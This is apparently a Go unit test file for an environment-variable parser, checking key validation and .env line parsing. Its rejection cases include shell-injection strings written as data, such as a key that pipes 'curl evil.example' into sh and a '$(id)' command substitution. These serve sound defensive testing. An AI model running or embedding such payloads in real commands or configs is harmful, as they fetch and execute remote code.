package env

import (
	"testing"
)

func TestIsValidKey(t *testing.T) {
	cases := []struct {
		in   string
		want bool
	}{
		{"FOO", true},
		{"FOO_BAR", true},
		{"_under", true},
		{"a1b2", true},
		{"", false},
		{"1FOO", false},                           // can't start with digit
		{"FOO BAR", false},                        // space
		{"FOO-BAR", false},                        // hyphen
		{"EVIL;curl evil.example|sh;X", false},    // shell-injection payload
		{"EVIL$(id)X", false},                     // command substitution
		{"EVIL\nINJECT=ok", false},                // newline
		{"EVIL=ok", false},                        // equals
	}
	for _, c := range cases {
		if got := IsValidKey(c.in); got != c.want {
			t.Errorf("IsValidKey(%q) = %v, want %v", c.in, got, c.want)
		}
	}
}

func TestParseEnvBytes_DropsInvalidKeys(t *testing.T) {
	in := "OK=1\nEVIL;curl evil.example=2\n_okay=3\n1bad=x\n"
	got := ParseEnvBytes([]byte(in))
	if _, ok := got["OK"]; !ok {
		t.Error("OK should survive")
	}
	if _, ok := got["_okay"]; !ok {
		t.Error("_okay should survive")
	}
	for k := range got {
		if !IsValidKey(k) {
			t.Errorf("invalid key %q leaked through ParseEnvBytes", k)
		}
	}
}

func TestParseEnvBytes(t *testing.T) {
	cases := []struct {
		name  string
		input string
		want  map[string]string
	}{
		{
			name:  "basic key=value",
			input: "A=1\nB=2\n",
			want:  map[string]string{"A": "1", "B": "2"},
		},
		{
			name:  "comments and blank lines skipped",
			input: "# comment\n\nA=1\n# another\nB=2\n",
			want:  map[string]string{"A": "1", "B": "2"},
		},
		{
			name:  "equals sign in value preserved",
			input: "TOKEN=abc=def==\n",
			want:  map[string]string{"TOKEN": "abc=def=="},
		},
		{
			name:  "whitespace trimmed from key",
			input: "  KEY  =value\n",
			want:  map[string]string{"KEY": "value"},
		},
		{
			name:  "leading whitespace in value preserved, trailing stripped",
			input: "A= hello world \n",
			want:  map[string]string{"A": " hello world"},
		},
		{
			name:  "line without equals skipped",
			input: "NOEQUALSSIGN\nA=1\n",
			want:  map[string]string{"A": "1"},
		},
		{
			name:  "empty input",
			input: "",
			want:  map[string]string{},
		},
		{
			name:  "empty value allowed",
			input: "A=\n",
			want:  map[string]string{"A": ""},
		},
		{
			name:  "windows line endings",
			input: "A=1\r\nB=2\r\n",
			want:  map[string]string{"A": "1", "B": "2"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := ParseEnvBytes([]byte(tc.input))
			if len(got) != len(tc.want) {
				t.Fatalf("got %v, want %v", got, tc.want)
			}
			for k, wv := range tc.want {
				if got[k] != wv {
					t.Errorf("key %q: got %q, want %q", k, got[k], wv)
				}
			}
		})
	}
}
